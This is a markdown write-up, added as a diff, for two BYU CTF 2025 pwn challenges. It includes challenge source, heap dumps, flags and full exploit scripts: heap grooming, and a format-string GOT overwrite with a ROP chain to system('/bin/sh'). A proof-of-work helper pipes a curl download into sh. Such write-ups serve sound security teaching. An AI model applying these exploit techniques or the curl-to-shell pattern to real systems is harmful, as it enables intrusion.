@@ -1,0 +1,465 @@
+---
+title: '[WRITE UP] - BYU CTF 2025'
+description: 'Yet another CTF wrtite up'
+image: '../../img/cover_photo_wup_imresizer.png'
+date: 2025-05-26
+tags: ['2025', 'PWN', 'WriteUp']
+authors: ['kdot']
+draft: true
+pinned: false
+---
+
+import Challenge from '@/components/mdx/Challenge.astro'
+
+## Minecraft Youtuber
+
+### Challenge Information
+
+<Challenge
+  authors={["overllama"]}
+  category="pwn"
+  description="Oh boy, I hit a million subscribers on YouTube, what do I do now?"
+  flag="byuctf{th3_3xpl01t_n4m3_1s_l1t3r4lly_gr00m1ng}"
+>
+</Challenge>
+
+### Solution
+
+<details id="src">
+<summary>Souce code</summary>
+<p>
+```c title="minecraft.c"
+#include <stdlib.h>
+#include <stdio.h>
+#include <time.h>
+#include <unistd.h>
+
+__attribute__((constructor)) void flush_buf() {
+    setbuf(stdin, NULL);
+    setbuf(stdout, NULL);
+    setbuf(stderr, NULL);
+}
+
+typedef struct {            // 0x18 bytes
+    long uid;               // 0x8 bytes
+    char username[8];       // 0x8 bytes
+    long keycard;           // 0x8 bytes
+} user_t;
+
+typedef struct {
+    long mfg_date;         // 0x8 bytes
+    char first[8];         // 0x8 bytes
+    char last[8];          // 0x8 bytes
+} nametag_t;
+
+long UID = 0x1;
+char filename[] = "flag.txt";
+user_t* curr_user = NULL;
+nametag_t* curr_nametag = NULL;
+
+void init() {
+    setvbuf(stdout, NULL, _IONBF, 0);
+    setvbuf(stdin, NULL, _IONBF, 0);
+}
+
+
+// Malloc -> tạo vùng nhớ trên heap malloc(size)
+void register_user() {
+    printf("WELCOME!! We're so excited to have you here! Tell us your username / tag and we'll get you set up with access to the facilities!\n");
+    curr_user = (user_t*)malloc(sizeof(user_t)); // 0x18 bytes
+    curr_user->uid = UID++;
+    printf("Please go ahead an type your username now: \n");
+    read(0, curr_user->username, 8);
+
+    // 0 - STDIM
+    // 1 - STDOUT
+    // 2 - STDERR
+}
+
+void log_out() {
+    free(curr_user);
+    curr_user = NULL;
+
+    // Nếu nametag ko có dữ liệu ko free
+    if (curr_nametag != NULL) {
+        free(curr_nametag);
+        curr_nametag = NULL;
+    }
+}
+
+int print_menu() {
+    int choice;
+    printf("What would you like to do now?\n");
+    printf("1. Register a new user\n");
+    printf("2. Learn about the Time Keepers\n");
+    printf("3. Collect gear\n");
+    printf("4. Elevate to super user\n");
+    printf("5. Change characters\n");
+    printf("6. Leave\n");
+    // 7 is try to free loki but it's not technically an option, you have to be rebellious to get there
+    scanf("%d", &choice);
+    if (choice < 1 || choice > 7) {
+        printf("Invalid choice. You broke the simulation\n");
+        return 0;
+    }
+    return choice;
+}
+
+int main(void) {
+    init();
+    srand(time(NULL)); int gear;
+    printf("Hello! My name is Miss Minutes, and I'll be your helper here at the TVA!!\nHow about we get you oriented first!\nThe only rule is that we under no circumstances can free Loki... he's locked up for a reason!\n");
+
+    int input = 1;
+    while (input) {
+        switch (input) {
+            case 1: // register a new user
+                register_user();
+                break;
+            case 2:
+                printf("The Time Keepers are the three beings who created the TVA and the Sacred Timeline. They are powerful beings who exist at the end of time and are responsible for maintaining the flow of time.\n");
+                break;
+            case 3: // collect gear
+                if (curr_user == NULL) {
+                    printf("You must register a user first!\n");
+                    break;
+                }
+                gear = rand() % 5 + 1;
+                if (curr_nametag != NULL) {
+                    free(curr_nametag);
+                }
+                switch (gear) {
+                    case 1:
+                        printf("You have received a Time Twister! This powerful device allows you to manipulate time and space.\n");
+                        break;
+                    case 2:
+                        printf("You have received a Name Tag! Please input your first and last name:\n");
+                        curr_nametag = (nametag_t*)malloc(sizeof(nametag_t));
+                        curr_nametag->mfg_date = (long)time(NULL);
+                        read(0, curr_nametag->first, 8);
+                        read(0, curr_nametag->last, 8);
+                        break;
+                    case 3:
+                        printf("You have received a Time Stick! This device allows you to reset the flow of time in a specific area.\n");
+                        break;
+                    case 4:
+                        printf("You have received a Time Loop! This device allows you to trap someone in a time loop.\n");
+                        break;
+                    case 5:
+                        printf("You have received a Time Bomb! This device allows you to create a temporal explosion.\n");
+                        break;
+                }
+                break;
+            case 4:
+                if (curr_user == NULL) {
+                    printf("You must register a user first!\n");
+                    break;
+                }
+                if (curr_user->uid >= 0x600000) {
+                    printf("Well, everything here checks out! Go ahead and take this key card!\n");
+                    curr_user->keycard = 0x1337;
+                } else {
+                    printf("Unfortunately, it doesn't look like you have all the qualifications to get your own key card! Stay close to Miss Minutes and she should be able to get you anywhere you need to go...\n");
+                }
+                break;
+            case 5:
+                if (curr_user == NULL) {
+                    printf("You must register a user first!\n");
+                    break;
+                }
+                log_out();
+                printf("You have been logged out.\n");
+                printf(". "); sleep(1);
+                printf(". "); sleep(1);
+                printf(". \n"); sleep(1);
+                register_user();
+                break;
+            case 6:
+                input = 0;
+                break;
+            case 7:
+                if (curr_user == NULL) {
+                    printf("You must register a user first!\n");
+                    break;
+                }
+
+                // Uninitialized memory read
+                if (curr_user->keycard == 0x1337) {
+                    printf("You have freed Loki! In gratitude, he offers you a flag!\n");
+                    FILE* flag = fopen(filename, "r");
+                    if (flag == NULL) {
+                        printf("Flag file not found. Please contact an admin.\n");
+                        return EXIT_FAILURE;
+                    } else {
+                        char ch;
+                        while ((ch = fgetc(flag)) != EOF) {
+                            printf("%c", ch);
+                        }
+                    }
+                    fclose(flag);
+                    exit(0);
+                    break;
+                } else {
+                    printf("EMERGENCY EMERGENCY UNAUTHORIZED USER HAS TRIED TO FREE LOKI!\n");
+                    printf("Time police rush to the room where you stand in shock. They rush you away, take your gear, and kick you back to your own timeline.\n");
+                    log_out();
+                    input = 0;
+                    break;
+                }
+        }
+
+        if (input != 0) {
+            input = print_menu();
+        }
+    }
+    return input;
+}
+```
+</p>
+</details>
+
+Look at the code above, it pretty long. But we just need to focus on `case 7` where we can get the flag if we have the keycard. And there is the bug `Uninitialized data use` in the code. We can `fengshui` the heap to get the flag. What I do is just let the program run until it shows us `Tag`, then create a new nametage which `curr_nametag->last` is contain the value `0x1337`
+
+```sh title="GDB"
+0x555555559290  0x0000000000000000      0x0000000000000021      ........!.......
+0x5555555592a0  0x0000000000000001      0x000000000a6e776b      ........kwn.....
+0x5555555592b0  0x0000000000000000      0x0000000000000021      ........!.......
+0x5555555592c0  0x000000006833e68f      0x000000000a6e776b      ..3h....kwn.....
+0x5555555592d0  0x0000000000001337      0x0000000000020d31      7.......1.......         <-- Top chunk
+```
+
+You can see that value `0x1337` is in the top chunk, and when you free it it will be there, because malloc just free the chunk `0x20` (include metadata). Then just `register_user` and get the flag
+
+```py title="exploit.py" collapse={1-36}
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwnie import *
+from subprocess import check_output
+from time import sleep
+
+context.log_level = 'debug'
+context.terminal = ["wt.exe", "-w", "0", "split-pane", "--size", "0.65", "-d", ".", "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"]
+exe = context.binary = ELF('./minecraft', checksec=False)
+libc = exe.libc
+
+gdbscript = '''
+init-pwndbg
+# init-gef-bata
+brva 0x171C
+brva 0x1462
+brva 0x1739
+brva 0x147C
+brva 0x18B0
+brva 0x171C
+c
+'''
+
+def start(argv=[]):
+    if args.REMOTE:
+        return remote(sys.argv[1], sys.argv[2])
+    elif args.DOCKER:
+        p = remote("localhost", 5000)
+        sleep(0.5)
+        pid = int(check_output(["pidof", "-s", "/app/run"]))
+        gdb.attach(int(pid), gdbscript=gdbscript+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe", exe=exe.path)
+        pause()
+        return p
+    else:
+        return process([exe.path] + argv, aslr=False)
+
+# ==================== EXPLOIT ====================
+p = start()
+
+ru(b"username now: \n")
+sl(b"kwn")
+
+line = b""
+while b"Tag" not in line:
+    ru(b"Leave\n")
+    sl(b"3")
+    line = p.recvline()
+
+if args.GDB:
+    gdb.attach(p, gdbscript=gdbscript)
+    pause()
+
+sl(b'kwn')
+sl(p64(0x1337))
+
+sl(b'5')
+sla(b'now: \n', b'kwn')
+
+ru(b"Leave\n")
+sl(b"7")
+
+interactive()
+```
+
+## GOAT
+
+### Challenge Information
+
+<Challenge
+  authors={["Legoclones"]}
+  category="pwn"
+  description="To prevent excessive brute forcing for those experiencing a skissue, I made sure to add a PoW."
+  flag="byuctf{n0w_y0u're_the_g0at!}"
+>
+</Challenge>
+
+### Solution
+
+There many things here but I think we just need to focus on the challenge `binary`
+
+```c
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  _QWORD v4[2]; // [rsp+0h] [rbp-C0h] BYREF
+  char s1[64]; // [rsp+10h] [rbp-B0h] BYREF
+  char s[104]; // [rsp+50h] [rbp-70h] BYREF
+  unsigned __int64 v7; // [rsp+B8h] [rbp-8h]
+
+  v7 = __readfsqword(0x28u);
+  v4[0] = 1413566279LL;
+  v4[1] = 0LL;
+  snprintf(
+    s,
+    0x5FuLL,
+    "Welcome to the %s simulator!\nLet's see if you're the %s...\nWhat's your name? ",
+    (const char *)v4,
+    (const char *)v4);
+  printf(s);
+  fgets(s1, 32, stdin);
+  snprintf(s, 0x5FuLL, "Are you sure? You said:\n%s\n", s1);
+  printf(s);
+  fgets(s1, 16, stdin);
+  if ( !strncmp(s1, "no", 2uLL) )
+  {
+    puts("\n?? Why would you lie to me about something so stupid?");
+  }
+  else
+  {
+    snprintf(s1, 0x3FuLL, "\nSorry, you're not the %s...", (const char *)v4);
+    puts(s1);
+  }
+  return 0;
+}
+```
+
+There is a `Format String Bug` here, so we can use that to get the shell. But the program will exit after that, so we need to make a infinite loop to keep the program running. After that leak the address and write our ROP chain to saved RIP using `Format String Bug`.
+
+```py title="exploit.py" collapse={1-72}
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwnie import *
+from subprocess import check_output
+from time import sleep
+import re
+
+context.log_level = 'debug'
+context.terminal = ["wt.exe", "-w", "0", "split-pane", "--size", "0.65", "-d", ".", "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"]
+exe = context.binary = ELF('./goat_patched', checksec=False)
+libc = exe.libc
+
+gdbscript = '''
+init-pwndbg
+# init-gef-bata
+# b *0x401278
+b *0x4012B0
+# b *0x40129F
+c
+'''
+
+def start(argv=[]):
+    if args.REMOTE:
+        return remote(sys.argv[1], sys.argv[2])
+    elif args.DOCKER:
+        p = remote("localhost", 5000)
+        sleep(0.5)
+        pid = int(check_output(["pidof", "-s", "/app/run"]))
+        gdb.attach(int(pid), gdbscript=gdbscript+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe", exe=exe.path)
+        pause()
+        return p
+    else:
+        return process([exe.path] + argv)
+
+def solve_pow():
+    banner = ru(b"solution: ")
+    log.debug(f"POW banner:\n{banner!r}")
+
+    m = re.search(b"sh -s (s\\.[^\\s]+)", banner)
+    if not m:
+        raise ValueError("Fail")
+    salt = m.group(1).decode()
+    log.info(f"{salt}")
+
+    cmd = f"curl -sSfL https://pwn.red/pow | sh -s {salt}"
+    solution = check_output(["bash", "-lc", cmd]).strip()
+    log.info(f"{solution!r}")
+
+    sl(solution)
+
+def fmt_w(addr, saved_rip):
+    target1 = addr & 0xffff
+    payload = f"%{target1-0x18}c%10$hn".encode()
+    payload = payload.ljust(0x10, b"a")
+    payload += p64(saved_rip)
+    sl(payload)
+    sl("A")
+
+    target2 = (addr >> 16) & 0xffff
+    payload = f"%{target2-0x18}c%10$hn".encode()
+    payload = payload.ljust(0x10)
+    payload += p64(saved_rip+2)
+    sl(payload)
+    sl("A")
+
+    target3 = addr >> 32
+    payload = f"%{target3-0x18}c%10$hn".encode()
+    payload = payload.ljust(0x10, b"a")
+    payload += p64(saved_rip+4)
+    sl(payload)
+    sl("A")
+
+# ==================== EXPLOIT ====================
+p = start()
+
+solve_pow()
+
+if args.GDB:
+    gdb.attach(p, gdbscript=gdbscript)
+    pause()
+
+payload = f"%{0x11f0-0x18}c%11$hn".encode() + b"|%31$p" + b"|%30$p"
+payload = payload.ljust(0x18, b"a")
+payload += p64(exe.got.puts)
+sl(payload)
+ru(b"|")
+address = rl()[:-1].split(b"|")
+print(address)
+libc.address = int(address[0], 16) - 0x2A1CA
+stack = int(address[1][:14], 16)
+saved_rip = stack - 0x98
+
+success('libc base @ %#x', libc.address)
+success('stack leak @ %#x', stack)
+success('saved rip @ %#x', saved_rip)
+
+rop = ROP(libc)
+pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
+ret = pop_rdi + 1
+binsh = next(libc.search(b"/bin/sh\x00"))
+
+fmt_w(pop_rdi, saved_rip)
+fmt_w(binsh, saved_rip+8)
+fmt_w(ret, saved_rip+16)
+fmt_w(libc.sym.system, saved_rip + 24)
+
+payload = f"%{0x133c-0x18}c%10$hn".encode()
+payload = payload.ljust(0x10)
+payload += p64(exe.got.puts)
+sl(payload)
+sl("A")
+
+interactive()
+```
